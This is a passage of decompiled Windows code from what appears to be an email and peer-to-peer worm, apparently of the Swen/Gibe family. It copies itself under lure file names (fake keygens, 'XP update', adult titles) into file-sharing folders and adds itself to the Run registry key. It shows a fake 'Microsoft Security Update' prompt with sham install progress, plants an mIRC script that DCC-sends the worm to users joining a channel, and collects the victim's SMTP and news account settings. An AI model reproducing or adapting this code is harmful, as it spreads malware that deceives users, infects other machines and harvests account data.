                            _t112 =  &_v452;
                            _push( &_v452);
                            __imp__GetFileAttributesA();
                            _v192 =  &_v452;
                            if(( &_v452 & 16) != 0 &&  &_v452 != -1) {
                                _push(6);
                                L00406850();
                                _push( &(( &_v452)[4]));
                                _push( &_v608);
                                L004068F4();
                                _push(_t181);
                                _push( &_v452);
                                L0040A100( &_v452);
                                _push( &_v608);
                                _push( &_v452);
                                L0040A100( &_v452);
                                L0040A100( &_v452,  &_v452, _t206);
                                __esp = __esp + 28;
                                _push(1);
                                _t112 =  &_v452;
                                _push( &_v452);
                                _push(_a8);
                                 *_t212();
                            }
                            _v464 = _v464 + 1;
                            _push(1);
                            _pop(__eax);
                            continue;
                        }
                        if(_t122 != 1) {
                            goto L51;
                        }
                        _t123 =  &_v160;
                        goto L50;
                    }
                    _t132 = _t119 - 1;
                    if(_t132 == 0) {
                        _push("Default User");
                        goto L45;
                    }
                    if(_t132 != 1) {
                        goto L46;
                    }
                    _push("Administrator");
                    goto L45;
                }
                if(_t115 != 1) {
                    goto L39;
                }
                _t116 =  &_v508;
                goto L38;
            }
            _v460 = _v460 + 1;
        }
        _v456 = _v456 + 1;
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
}

L00408444(
    char* _a4                              // _cfa_4
)
{
    char* _v8;                             // _cfa_fffffff8
    char* _v12;                            // _cfa_fffffff4
    char* _v16;                            // _cfa_fffffff0
    char* _v20;                            // _cfa_ffffffec
    char* _v24;                            // _cfa_ffffffe8
    char* _v28;                            // _cfa_ffffffe4
    char* _v32;                            // _cfa_ffffffe0
    char* _v36;                            // _cfa_ffffffdc
    char* _v40;                            // _cfa_ffffffd8
    char* _v44;                            // _cfa_ffffffd4
    char* _v48;                            // _cfa_ffffffd0
    char* _v52;                            // _cfa_ffffffcc
    char* _v56;                            // _cfa_ffffffc8
    char* _v60;                            // _cfa_ffffffc4
    char* _v64;                            // _cfa_ffffffc0
    char* _v68;                            // _cfa_ffffffbc
    char* _v72;                            // _cfa_ffffffb8
    char* _v76;                            // _cfa_ffffffb4
    char* _v80;                            // _cfa_ffffffb0
    char* _v84;                            // _cfa_ffffffac
    char* _v88;                            // _cfa_ffffffa8
    char* _v92;                            // _cfa_ffffffa4
    char* _v96;                            // _cfa_ffffffa0
    char* _v100;                           // _cfa_ffffff9c
    char* _v104;                           // _cfa_ffffff98
    char* _v108;                           // _cfa_ffffff94
    char* _v112;                           // _cfa_ffffff90
    char* _v116;                           // _cfa_ffffff8c
    char* _v120;                           // _cfa_ffffff88
    char* _v124;                           // _cfa_ffffff84
    char* _v128;                           // _cfa_ffffff80
    char* _v132;                           // _cfa_ffffff7c
    char* _v136;                           // _cfa_ffffff78
    char* _v140;                           // _cfa_ffffff74
    char* _v144;                           // _cfa_ffffff70
    char* _v148;                           // _cfa_ffffff6c
    char* _v152;                           // _cfa_ffffff68
    char* _v156;                           // _cfa_ffffff64
    char* _v160;                           // _cfa_ffffff60
    char* _v164;                           // _cfa_ffffff5c
    char* _v168;                           // _cfa_ffffff58
    char* _v172;                           // _cfa_ffffff54
    char* _v176;                           // _cfa_ffffff50
    char* _v180;                           // _cfa_ffffff4c
    char* __esi;                           // r5
    _unknown_ _t61;                        // _t61
    _unknown_ _t68;                        // _t68
    _unknown_ _t73;                        // _t73

    __esi = _a4;
    _v108 = "Kazaa Lite";
     *__esi = 0;
    _v104 = "KaZaA media desktop";
    _v100 = "KaZaA";
    _v96 = "WinRar";
    _v92 = "WinZip";
    _v88 = "Winamp";
    _v84 = "Mirc";
    _v80 = "Download Accelerator";
    _v76 = "GetRight FTP";
    _v72 = "Windows Media Player";
    _v68 = "key generator";
    _v64 = "hack";
    _v60 = "hacked";
    _v56 = "warez";
    _v52 = "upload";
    _v48 = "installer";
    _v44 = "Bugbear";
    _v40 = "Yaha";
    _v36 = "Gibe";
    _v32 = "Sircam";
    _v28 = "Sobig";
    _v24 = "Klez";
    _v20 = "remover";
    _v16 = "removal tool";
    _v12 = "cleaner";
    _v8 = "fixtool";
    _v180 = "AOL hacker";
    _v176 = "Yahoo hacker";
    _v172 = "Hotmail hacker";
    _v168 = "10.000 Serials";
    _v164 = "Jenna Jameson";
    _v160 = "HardPorn";
    _v156 = "Sex";
    _v152 = "XboX Emulator";
    _v148 = "Emulator PS2";
    _v144 = "XP update";
    _v140 = "XXX Video";
    _v136 = "Sick Joke";
    _v132 = "XXX Pictures";
    _v128 = "My naked sister";
    _v124 = "Hallucinogenic Screensaver";
    _v120 = "Cooking with Cannabis";
    _v116 = "Magic Mushrooms Growing";
    _v112 = "Virus Generator";
    _t61 = L00406840(50);
    _pop(__ecx);
    if(_t61 == 0) {
        if(L00406840(27) == 0) {
            _push(18);
            L0040A0F0(__edx, __esi,  *((intOrPtr*)(__ebp + L00406850() * 4 - 180)));
            __esp = __esp + 4;
        } else {
            _push(6);
            _push( *((intOrPtr*)(__ebp + L00406850() * 4 - 44)));
            _push(__esi);
            _t68 = L0040A0F0(__edx);
            _push(" ");
            _push(__esi);
            L0040A100(_t68);
            _push(4);
            _push( *((intOrPtr*)(__ebp + L00406850() * 4 - 20)));
            goto L2;
        }
    } else {
        _push(10);
        _push( *((intOrPtr*)(__ebp + L00406850() * 4 - 108)));
        _push(__esi);
        _t73 = L0040A0F0(__edx);
        _push(" ");
        _push(__esi);
        L0040A100(_t73);
        _push(6);
        _push( *((intOrPtr*)(__ebp + L00406850() * 4 - 68)));
L2:
        _push(__esi);
        L0040A100(_t70);
        __esp = __esp + 32;
    }
    if(L00406840(8) != 0) {
        _push(__esi);
        __imp__CharLowerA();
    }
    return __esi;
}

L0040864E(
    intOrPtr _a4,                          // _cfa_4
    signed int _a8                         // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    signed int _v20;                       // _cfa_ffffffec
    signed int _v28;                       // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    intOrPtr _v40;                         // _cfa_ffffffd8
    char _v48;                             // _cfa_ffffffd0
    intOrPtr _v52;                         // _cfa_ffffffcc
    char _v84;                             // _cfa_ffffffac
    intOrPtr _v88;                         // _cfa_ffffffa8
    intOrPtr _v92;                         // _cfa_ffffffa4
    intOrPtr _v96;                         // _cfa_ffffffa0
    intOrPtr _v100;                        // _cfa_ffffff9c
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t37;                         // _t37
    _unknown_ _t44;                        // _t44
    intOrPtr _t45;                         // _t45
    signed int _t46;                       // _t46
    intOrPtr _t50;                         // _t50
    _unknown_ _t51;                        // _t51
    signed int _t53;                       // _t53
    intOrPtr* _t54;                        // _t54
    intOrPtr _t55;                         // _t55
    intOrPtr* _t56;                        // _t56
    _unknown_ _t62;                        // _t62

    _push(-1);
    _push(4253120);
    _push(4236164);
    _t36 =  *fs:0x0];
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 80;
    _push(_t44);
    _push(_t55);
    _push(_t53);
    _v28 = __esp;
    _v8 = 0;
    _t45 = _a4;
    if(_t45 != 0) {
        _push(_t45);
        __imp__UpdateWindow();
        _push(_t45);
        _t37 = L00408962();
         *__esp = 1008;
        _push(_t45);
        _t56 = __imp__GetDlgItem;
         *_t56();
        _v96 = _t37;
        _push(_t37);
        __imp__GetDC();
        _v92 = _t37;
        _push(11141120);
        __imp__CreateSolidBrush();
        _v52 = _t37;
        _push(8);
        __imp__GetStockObject();
        _push(_t37);
        _push(_v92);
        _t54 = __imp__SelectObject;
         *_t54();
        _push(_v52);
        _push(_v92);
         *_t54();
        _push( &_v48);
        _push(_v96);
        __imp__GetClientRect();
        _t53 = _a8;
        if(_t53 == 0) {
            _push("Searching for installed components ...");
            goto L10;
        } else {
            _t62 = _t53 - 1;
            if(_t62 == 0) {
                _push("Extracting files ...");
                goto L10;
            } else {
                if(_t62 > 0) {
                    if(_t53 <= 3) {
                        _push("Copying files ...");
                        goto L10;
                    } else {
                        if(_t53 == 4) {
                            _push("Updating registry ...");
L10:
                            _push( &_v84);
                            L0040A0F0(_t51);
                            _pop(__ecx);
                            _pop(__ecx);
                        }
                    }
                }
            }
        }
        _push( &_v84);
        _push(1009);
        _push(_t45);
         *_t56();
        _push( &_v84);
        __imp__SetWindowTextA();
        asm("cdq");
        _push(5);
        _pop(__ecx);
        _t36 = (_v40 + -2) / _t46;
        _t50 = _t36 * _t53 + 1;
        _v32 = _t50;
        _t55 = (_t53 + 1) * _t36 + 2;
        _v100 = _t55;
        _v88 = _t50;
        while(_v88 <= _t55) {
            _t36 = _v36 - 1;
            _push(_v36 - 1);
            _push(_v88);
            _push(1);
            _push(1);
            _push(_v92);
            __imp__Rectangle();
            _push(20);
            __imp__Sleep();
            _v88 = _v88 + 1;
        }
        _push(_v92);
        _push(_t45);
        __imp__ReleaseDC();
        _push(_v52);
        __imp__DeleteObject();
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
}

L004087D7(
    _unknown_ __edx,                       // r3
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    intOrPtr _a12,                         // _cfa_c
    intOrPtr _a16,                         // _cfa_10
    intOrPtr _a20                          // _cfa_14
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    char _v136;                            // _cfa_ffffff78
    intOrPtr _v140;                        // _cfa_ffffff74
    char _v240;                            // _cfa_ffffff10
    _unknown_ __ebx;                       // r1
    intOrPtr* __edi;                       // r4
    intOrPtr* __esi;                       // r5
    intOrPtr _t43;                         // _t43
    intOrPtr _t57;                         // _t57
    _unknown_ _t61;                        // _t61
    intOrPtr _t62;                         // _t62
    _unknown_ _t63;                        // _t63

    __edx = __edx;
    _push(-1);
    _push(4253136);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 220;
    _push(_t61);
    _push(__esi);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    _t62 = _a4;
    _v36 = _t62;
    _t42 = L0040A5F0(_t62, "012345:", 7);
    if(_t42 == 0) {
        _t57 = _t62 + 7;
        _v36 = _t57;
        _push(_t57);
        _push( &_v136);
        L0040A0F0(__edx);
        _t42 = L0040A0F0(__edx, _t62,  &_v136);
        __esp = __esp + 8;
    }
    _push(_t62);
    __imp__GetFileAttributesA();
    _v32 = _t42;
    if(_t42 != -1) {
        _t43 = L0040A210(_t42, _t62);
        _v32 = _t43;
        if( *((char*)(_t43 + _t62 - 1)) != 92) {
            _push("\\");
            _push(_t62);
            L0040A100(_t43);
            _pop(__ecx);
            _pop(__ecx);
        }
        _v140 = 0;
        __esi = __imp__wsprintfA;
        __edi = __imp__CopyFileA;
        while(_v140 < _a16) {
            _push( &_v240);
            _push(L00408444());
            _push(_t62);
            _push("%s%s.zip");
            _push( &_v136);
             *__esi();
            _push(_a8);
            _push(4271872);
            _push("%s\\%s.zip");
            _push( &_v240);
             *__esi();
            __esp = __esp + 36;
            _push(1);
            _push( &_v136);
            _push( &_v240);
             *__edi();
            if( &_v240 != 0) {
                L00407E9C( &_v136);
            }
            _v140 = _v140 + 1;
        }
        _v140 = 0;
        while(1) {
            _t42 = _v140;
            if(_v140 >= _a20) {
                goto L15;
            }
            _push( &_v240);
            L00408444();
            _push( &_v240);
            _push(_t62);
            _push("%s%s.exe");
            _push( &_v136);
             *__esi();
            __esp = __esp + 20;
            _push(1);
            _push( &_v136);
            _push(_a12);
             *__edi();
            if( &_v136 != 0) {
                L00407E9C( &_v136);
            }
            _v140 = _v140 + 1;
        }
    }
L15:
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
}

L00408962(
    intOrPtr _a4                           // _cfa_4
)
{
    char _v32;                             // _cfa_ffffffe0
    _unknown_ __esi;                       // r5

    _push(__esi);
    if(_a4 != 0) {
        __esi = 0;
        while(1) {
            _push(1);
            _push(0);
            _push(0);
            _push(_a4);
            _push( &_v32);
            __imp__PeekMessageA();
            if( &_v32 == 0) {
                goto L4;
            }
            _push( &_v32);
            _push(_a4);
            __imp__IsDialogMessageA();
            __esi = __esi + 1;
            if(__esi < 1000) {
                continue;
            }
            goto L4;
        }
    }
L4:
    _pop(__esi);
    return  &_v32;
}

L004089A1()
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    signed int _v32;                       // _cfa_ffffffe0
    intOrPtr* _v36;                        // _cfa_ffffffdc
    signed int _v40;                       // _cfa_ffffffd8
    char _v240;                            // _cfa_ffffff10
    signed int _v248;                      // _cfa_ffffff08
    char _v448;                            // _cfa_fffffe40
    char _v548;                            // _cfa_fffffddc
    signed int _v552;                      // _cfa_fffffdd8
    signed int _v556;                      // _cfa_fffffdd4
    signed int _v560;                      // _cfa_fffffdd0
    char _v660;                            // _cfa_fffffd6c
    char _v680;                            // _cfa_fffffd58
    char _v880;                            // _cfa_fffffc90
    char _v1140;                           // _cfa_fffffb8c
    char* _v1144;                          // _cfa_fffffb88
    char* _v1148;                          // _cfa_fffffb84
    char* _v1152;                          // _cfa_fffffb80
    char* _v1156;                          // _cfa_fffffb7c
    signed int _v1160;                     // _cfa_fffffb78
    char _v1296;                           // _cfa_fffffaf0
    _unknown_ _v1396;                      // _cfa_fffffa8c
    char _v1548;                           // _cfa_fffff9f4
    char _v1684;                           // _cfa_fffff96c
    signed int _v1688;                     // _cfa_fffff968
    signed int _v1692;                     // _cfa_fffff964
    char _v1792;                           // _cfa_fffff900
    char _v2049;                           // _cfa_fffff7ff
    char _v2050;                           // _cfa_fffff7fe
    char _v2051;                           // _cfa_fffff7fd
    char _v2052;                           // _cfa_fffff7fc
    signed int _v2056;                     // _cfa_fffff7f8
    signed int _v2060;                     // _cfa_fffff7f4
    signed int _v2064;                     // _cfa_fffff7f0
    char _v2216;                           // _cfa_fffff758
    char _v2368;                           // _cfa_fffff6c0
    char _v2468;                           // _cfa_fffff65c
    char* _v2472;                          // _cfa_fffff658
    char _v2572;                           // _cfa_fffff5f4
    char* _v2576;                          // _cfa_fffff5f0
    char* _v2580;                          // _cfa_fffff5ec
    char* _v2584;                          // _cfa_fffff5e8
    signed int* _v2588;                    // _cfa_fffff5e4
    signed int* _v2592;                    // _cfa_fffff5e0
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t319;                      // _t319
    signed int _t320;                      // _t320
    _unknown_ _t321;                       // _t321
    char* _t342;                           // _t342
    signed int _t349;                      // _t349
    signed int _t352;                      // _t352
    signed int _t361;                      // _t361
    signed int _t365;                      // _t365
    signed int _t375;                      // _t375
    signed int _t378;                      // _t378
    signed int _t383;                      // _t383
    signed int _t384;                      // _t384
    signed int _t470;                      // _t470
    signed int _t482;                      // _t482
    signed int _t488;                      // _t488
    char* _t496;                           // _t496
    intOrPtr* _t515;                       // _t515
    _unknown_ _t519;                       // _t519
    _unknown_ _t523;                       // _t523
    signed int _t528;                      // _t528
    intOrPtr* _t530;                       // _t530
    signed int _t536;                      // _t536
    _unknown_ _t537;                       // _t537
    signed int _t538;                      // _t538
    intOrPtr* _t539;                       // _t539

    _push(-1);
    _push(4253152);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 2572;
    _push(_t523);
    _push(_t537);
    _push(_t528);
    _v28 = __esp;
    _v32 = 0;
    _v8 = 0;
    _t538 = 4302344;
    if(L00406DCD(4302344) != 0) {
L4:
        _push(200);
        _push( &_v240);
        _push(0);
        __imp__GetModuleFileNameA();
        _push(92);
        _push( &_v240);
        _t319 = L0040A1E0( &_v1396);
        _pop(__ecx);
        _pop(__ecx);
        _v40 = _t319;
        if(_t319 != 0) {
            _t320 = _t319 + 1;
            __eflags = _t320;
        } else {
            _t320 =  &_v240;
        }
        _v40 = _t320;
        _t321 =  *_t320;
        if(_t321 == 112 || _t321 == 80 || _t321 == 113 || _t321 == 81 || _t321 == 117 || _t321 == 85 || _t321 == 105 || _t321 == 73) {
            _v32 = 1;
        }
        if(L0040679E(-2147483646, _t538, "Installed",  &_v548) == 0) {
L20:
            _push(5);
            _push(L00406850() + 3);
            _push( &_v680);
            L004068F4();
            _push(".exe");
            _push( &_v680);
            L0040A100( &_v680);
            _push( &_v680);
            _push(4271872);
            _push("%s\\%s");
            _push( &_v1140);
            _t539 = __imp__wsprintfA;
             *_t539();
            __esp = __esp + 36;
            _push(1);
            _push( &_v1140);
            _push( &_v240);
            __imp__CopyFileA();
            _push( &_v680);
            _push("%s autorun");
            _push( &_v548);
             *_t539();
            _push(6);
            L00406850();
            _push( &(((char*)( &_v548))[0]));
            _push( &_v880);
            L004068F4();
            _push( &_v548);
            _push(1);
            _push( &_v880);
            _push("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            _push(-2147483646);
            L004066EB();
            L004066EB(-2147483646, 4302344, "Install Item", 1,  &_v880);
            __esp = __esp + 44;
            __eflags = _v32;
            if(_v32 != 0) {
                _push(36);
                _push("Microsoft Internet Update Pack");
                _push("This will install Microsoft Security Update.\n\nDo you wish to continue?");
                _push(0);
                __imp__MessageBoxA();
                __eflags =  &_v880 - 7;
                if( &_v880 == 7) {
                    _v32 = 0;
                }
            }
            _v36 = 100;
            _push( &_v36);
            _t342 =  &_v548;
            _push( &_v548);
            __imp__GetComputerNameA();
            __eflags =  &_v548;
            if( &_v548 != 0) {
                _push( &_v548);
                _push(4271872);
                _push("%s\\%s.bat");
                _push( &_v880);
                 *_t539();
                __esp = __esp + 16;
                _push(0);
                _push(128);
                _push(2);
                _push(0);
                _push(0);
                _push(1073741824);
                _t342 =  &_v880;
                _push( &_v880);
                __imp__CreateFileA();
                _v2472 =  &_v880;
                __eflags =  &_v880 - -1;
                if( &_v880 != -1) {
                    _push( &_v680);
                    _push("\nECHO OFF\nIF NOT "%%1"=="" %s %%1\n");
                    _push( &_v548);
                     *_t539();
                    __esp = __esp + 12;
                    _push(0);
                    _push( &_v36);
                    L0040A210( &_v548,  &_v548);
                    _push( &_v548);
                    _push( &_v548);
                    _push(_v2472);
                    __imp__WriteFile();
                    _push(_v2472);
                    __imp__SetEndOfFile();
                    _push(_v2472);
                    __imp__CloseHandle();
                    _t342 =  &_v880;
                    L00407E9C( &_v880);
                }
            }
            _v1156 = 0;
            __eflags = _v32;
            if(_v32 != 0) {
                _push(0);
                _push(4229037);
                _push(0);
                _push(123);
                _push( *4302228);
                __imp__CreateDialogParamA();
                _v1156 = _t342;
                _push(0);
                _push(_t342);
                L0040864E();
                _pop(__ecx);
                _pop(__ecx);
            }
            L0040772C(_v1156);
            __eflags = _v32;
            if(_v32 != 0) {
                _push(1);
                _push(_v1156);
                L0040864E();
                _pop(__ecx);
                _pop(__ecx);
            }
            _v1692 = 0;
            _push( &_v1792);
            _push(100);
            __imp__GetTempPathA();
            _v36 =  &_v1792;
            __eflags =  *((char*)(__ebp +  &_v1792 - 1789)) - 92;
            if( *((char*)(__ebp +  &_v1792 - 1789)) != 92) {
                _push("\\");
                _push( &_v1792);
                L0040A100( &_v1792);
                _pop(__ecx);
                _pop(__ecx);
            }
            _push( &_v548);
            L004073F8();
            _push( &_v548);
            _push( &_v1792);
            L0040A100( &_v1792);
            L0040A100( &_v1792,  &_v1792, ".exe");
            __esp = __esp + 12;
            _push(1);
            _push( &_v1792);
            _push( &_v240);
            __imp__CopyFileA();
            _push(4);
            L00406850();
            _t349 =  &_v240 + 3;
            __eflags = _t349;
            _push(_t349);
            _push( &_v1396);
            L004068F4();
            _push( &_v1396);
            _push(4271872);
            _push("%s\\%s.zip");
            _push( &_v2216);
             *_t539();
            __esp = __esp + 28;
            _v552 = 0;
            _t530 = __imp__ShellExecuteA;
            while(1) {
                _t352 = _v552;
                __eflags = _t352 - 2;
                if(_t352 >= 2) {
                    break;
                }
                _t488 = _t352;
                __eflags = _t488;
                if(_t488 == 0) {
                    _push("WinRar.exe");
                    _push( &_v2368);
                    L0040A0F0(__edx);
                    _push( &_v1792);
                    _push( &_v2216);
                    _push("A -EP %s %s");
L38:
                    _push( &_v1548);
                     *_t539();
                    __esp = __esp + 24;
L39:
                    _push(0);
                    _push(0);
                    _push( &_v1548);
                    _push( &_v2368);
                    _push(0);
                    _push(0);
                     *_t530();
                    __eflags =  &_v2368 - 32;
                    if( &_v2368 > 32) {
L45:
                        _v1692 = 1;
                        break;
                    }
                    _push("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\");
                    _push( &_v548);
                    L0040A0F0(__edx);
                    _pop(__ecx);
                    _pop(__ecx);
                    __eflags = _v552;
                    _t496 = "WinRar.exe";
                    if(_v552 != 0) {
                        _t496 = "WinZip.exe";
                    }
                    _push(_t496);
                    _push( &_v548);
                    L0040A100( &_v548);
                    L0040679E(-2147483646,  &_v548, 0,  &_v2368);
                    __esp = __esp + 8;
                    __eflags =  &_v548;
                    if( &_v548 == 0) {
L44:
                        _v552 = _v552 + 1;
                        continue;
                    } else {
                        _push(0);
                        _push(0);
                        _push( &_v1548);
                        _push( &_v2368);
                        _push(0);
                        _push(0);
                         *_t530();
                        __eflags =  &_v2368 - 32;
                        if( &_v2368 > 32) {
                            goto L45;
                        }
                        goto L44;
                    }
                }
                __eflags = _t488 != 1;
                if(_t488 != 1) {
                    goto L39;
                }
                _push("WinZip.exe");
                _push( &_v2368);
                L0040A0F0(__edx);
                _push( &_v2216);
                _push( &_v1792);
                _push("-min -e -o %s %s");
                goto L38;
            }
            __eflags = _v1692;
            if(_v1692 != 0) {
                _push( &_v1396);
                _push(1);
                _push("ZipName");
                _push(4302344);
                _push(-2147483646);
                L004066EB();
                L00407E9C( &_v2216);
                __esp = __esp + 20;
                _push(1000);
                __imp__Sleep();
            }
            _push( &_v1792);
            __imp__DeleteFileA();
            _v2064 = 0;
            _push( &_v2064);
            _push(1);
            _push(0);
            _push("Software\\Kazaa");
            _push(-2147483647);
            __imp__RegOpenKeyExA();
            __eflags = _v2064;
            if(_v2064 == 0) {
L68:
                __eflags = _v32;
                if(_v32 != 0) {
                    _push(2);
                    _push(_v1156);
                    L0040864E();
                    _pop(__ecx);
                    _pop(__ecx);
                }
                _v552 = 0;
                while(1) {
                    __eflags = _v552 - 2;
                    if(_v552 >= 2) {
                        break;
                    }
                    __eflags = _v552;
                    if(_v552 != 0) {
                        L0040679E(-2147483646, "Software\\Microsoft\\Windows\\CurrentVersion", "ProgramFilesDir",  &_v548);
                    } else {
                        _push("C:");
                        _push( &_v548);
                        L0040A0F0(__edx);
                        _pop(__ecx);
                        _pop(__ecx);
                    }
                    _v560 = 0;
                    while(1) {
                        __eflags = _v560 - 2;
                        if(_v560 >= 2) {
                            break;
                        }
                        __eflags = _v560;
                        if(_v560 != 0) {
                            _push("\\mirc32");
                        } else {
                            _push("\\mirc");
                        }
                        _push( &_v548);
                        L0040A100( &_v548);
                        _pop(__ecx);
                        _pop(__ecx);
                        _push( &_v548);
                        _push( &_v880);
                        L0040A0F0(__edx);
                        L0040A100( &_v880,  &_v880, "\\mirc.ini");
                        __esp = __esp + 8;
                        _push( &_v880);
                        __imp__GetFileAttributesA();
                        __eflags =  &_v880 - -1;
                        if( &_v880 == -1) {
L91:
                            _v560 = _v560 + 1;
                            continue;
                        } else {
                            _push( &_v548);
                            _push( &_v2468);
                            L0040A0F0(__edx);
                            _push( &_v548);
                            _push( &_v880);
                            L0040A0F0(__edx);
                            L0040A100( &_v880,  &_v880, "\\script.ini");
                            __esp = __esp + 16;
                            _push( &_v880);
                            __imp__GetFileAttributesA();
                            __eflags =  &_v880 - -1;
                            if( &_v880 != -1) {
                                _push("\\script.bcp");
                                _push( &_v548);
                                L0040A100( &_v548);
                                _pop(__ecx);
                                _pop(__ecx);
                                _push( &_v548);
                                _push( &_v880);
                                __imp__MoveFileA();
                            }
                            _push(0);
                            _push(128);
                            _push(2);
                            _push(0);
                            _push(1);
                            _push(1073741824);
                            _push( &_v880);
                            __imp__CreateFileA();
                            _v2576 =  &_v880;
                            __eflags =  &_v880 - -1;
                            if( &_v880 == -1) {
                                goto L91;
                            } else {
                                __eflags = _v1692;
                                _push( &_v880);
                                if(_v1692 == 0) {
                                    L00408444();
                                    _push( &_v880);
                                    _push(4271872);
                                    _push("%s\\%s.exe");
                                    _push( &_v548);
                                     *_t539();
                                    __esp = __esp + 20;
                                    _push(200);
                                    _push( &_v880);
                                    _push(0);
                                    __imp__GetModuleFileNameA();
                                } else {
                                    L00408444();
                                    _push( &_v880);
                                    _push(4271872);
                                    _push("%s\\%s.zip");
                                    _push( &_v548);
                                     *_t539();
                                    L0040A0F0(__edx,  &_v880,  &_v2216);
                                    __esp = __esp + 20;
                                }
                                _push(1);
                                _push( &_v548);
                                _push( &_v880);
                                __imp__CopyFileA();
                                __eflags =  &_v880;
                                if( &_v880 != 0) {
                                    L00407E9C( &_v548);
                                }
                                _push("[script]\nn0= on 1:JOIN:#:{\nn1= /if ( $nick == $me ) { halt }\nn2= /.dcc send $nick "");
                                _push( &_v880);
                                L0040A0F0(__edx);
                                _push( &_v548);
                                _push( &_v880);
                                L0040A100( &_v880);
                                L0040A100( &_v880,  &_v880, ""\nn3=}\n");
                                __esp = __esp + 16;
                                _v36 = 0;
                                _push(0);
                                _push( &_v36);
                                L0040A210( &_v880,  &_v880);
                                _push( &_v880);
                                _push( &_v880);
                                _push(_v2576);
                                __imp__WriteFile();
                                _push(_v2576);
                                __imp__CloseHandle();
                                L004066EB(-2147483646, 4302344, "Mirc Install Folder", 1,  &_v2468);
                                break;
                            }
                        }
                    }
                    _v552 = _v552 + 1;
                }
                _push( &_v548);
                _push("Default Mail Account");
                _push("SOFTWARE\\Microsoft\\Internet Account Manager");
                _push(-2147483647);
                L0040679E();
                L0040679E(-2147483647, "SOFTWARE\\Microsoft\\Internet Account Manager", "Default News Account",  &_v880);
                __esp = __esp + 16;
                __eflags = _v548;
                if(_v548 == 0) {
                    _push("00000001");
                    _push( &_v548);
                    L0040A0F0(__edx);
                    _pop(__ecx);
                    _pop(__ecx);
                }
                _push( &_v548);
                _push("SOFTWARE\\Microsoft\\Internet Account Manager\\Accounts\\%s");
                _push( &_v448);
                 *_t539();
                _push( &_v548);
                _push("SMTP Email Address");
                _push( &_v448);
                _push(-2147483647);
                L0040679E();
                _push(1);
                _t361 =  &_v548;
                _push( &_v548);
                L004075E3( &_v1396);
                __esp = __esp + 36;
                __eflags =  &_v548;
                if( &_v548 != 0) {
                    _push( &_v548);
                    _push( &_v660);
                    L0040A0F0(__edx);
                    _push( &_v548);
                    _push("SMTP Server");
                    _push( &_v448);
                    _push(-2147483647);
                    L0040679E();
                    _push(0);
                    _t361 =  &_v548;
                    _push( &_v548);
                    L004075E3( &_v1396);
                    __esp = __esp + 32;
                    __eflags =  &_v548;
                    if( &_v548 != 0) {
                        _push( &_v660);
                        _push(1);
                        _push("Email Address");
                        _push(4302344);
                        _push(-2147483646);
                        L004066EB();
                        _push( &_v548);
                        _push(1);
                        _push("Server");
                        _push(4302344);
                        _push(-2147483646);
                        L004066EB();
                        L0040679E(-2147483647,  &_v448, "SMTP Display Name",  &_v548);
                        __esp = __esp + 40;
                        __eflags = _v548;
                        if(_v548 == 0) {
                            _v36 = 100;
                            _push( &_v36);
                            _push( &_v548);
                            __imp__GetComputerNameA();
                            __eflags =  &_v548;
                            if( &_v548 == 0) {
                                _push("unknown");
                                _push( &_v548);
                                L0040A0F0(__edx);
                                _pop(__ecx);
                                _pop(__ecx);
                            }
                        }
                        _t361 =  &_v548;
                        L004066EB(-2147483646, 4302344, "VicName", 1,  &_v548);
                    }
                }
                __eflags = _v880;
                if(_v880 != 0) {
                    _push( &_v880);
                    _push("SOFTWARE\\Microsoft\\Internet Account Manager\\Accounts\\%s");
                    _push( &_v448);
                     *_t539();
                    _push( &_v548);
                    _push("NNTP Server");
                    _push( &_v448);
                    _push(-2147483647);
                    L0040679E();
                    _push(0);
                    _t361 =  &_v548;
                    _push( &_v548);
                    L004075E3( &_v1396);
                    __esp = __esp + 36;
                    __eflags =  &_v548;
                    if( &_v548 != 0) {
                        _push(4271872);
                        _push( &_v880);
                        L0040A0F0(__edx);
                        L0040A100( &_v880,  &_v880, "\\swen0.dat");
                        __esp = __esp + 8;
                        _push(0);
                        _push(128);
                        _push(2);
                        _push(0);
                        _push(3);
                        _push(1073741824);
                        _t361 =  &_v880;
                        _push( &_v880);
                        __imp__CreateFileA();
                        _v2580 =  &_v880;
                        __eflags =  &_v880 - -1;
                        if( &_v880 != -1) {
                            _push(0);
                            _push( &_v36);
                            L0040A210( &_v548,  &_v548);
                            _push( &_v548);
                            _t361 =  &_v548;
                            _push( &_v548);
                            _push( &_v880);
                            __imp__WriteFile();
                            _push( &_v880);
                            __imp__CloseHandle();
                        }
                    }
                }
                __eflags = _v32;
                if(_v32 != 0) {
                    _push(3);
                    _push(_v1156);
                    L0040864E();
                    _pop(__ecx);
                    _pop(__ecx);
                }
                _push(0);
                __imp__GetModuleHandleA();
                _v2056 = _t361;
                _push("CUSTOM");
                _push(129);
                _push(_t361);
                __imp__FindResourceA();
                _v1688 = _t361;
                _push(_t361);
                _push(_v2056);
                __imp__SizeofResource();
                _v2060 = _t361;
                _push(_v1688);
                _push(0);
                __imp__LoadResource();
                _v1160 = _t361;
                __eflags = _t361;
                if(_t361 != 0) {
